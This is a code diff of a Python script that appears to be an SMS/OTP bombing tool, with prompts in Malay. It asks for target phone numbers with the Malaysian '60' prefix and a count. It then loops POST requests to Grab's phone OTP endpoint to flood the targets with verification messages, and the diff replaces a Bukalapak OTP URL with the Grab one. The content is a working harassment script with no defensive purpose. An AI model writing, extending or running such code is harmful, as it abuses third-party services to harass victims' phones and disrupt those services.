@@ -29,7 +29,7 @@ print("""%s
 /| |   | |\_//	%sMASUKKAN NOMBOR DENGAN "60" (EX: 601XXXXXXX)%s
 \| |._.| |/-’
  '"'   '"'
-<NOTE> Jika terjadi ERROR atau BUG dan lain-lain, silalah hubungi bapak saya"""%(c,r,g,r,g,r,g,r,g,r,w,r))
+<NOTE> Kalu ERROR @ BUG dan lain-lain, silalah hubungi bapak saya.."""%(c,r,g,r,g,r,g,r,g,r,w,r))
 print("%s[*] Klik ENTER untuk step seterusnya%s"%(g,g))
 no1 = input("[?] NO TARGET 1 => %s"%(w))
 no2 = input("%s[?] NO TARGET 2 => %s"%(g,w))
@@ -45,7 +45,7 @@ try:
 	for i in range(jlmh):
 		print("[!] PLEASE WAIT...")
 		idk=("challengeID")
-		r1 = requests.post('https://m.bukalapak.com/trusted_devices/otp_request',data=dt1)
+		r1 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt1)
 		r2 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt2)
 		r3 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt3)
 		if str(idk) in str(r1.text):
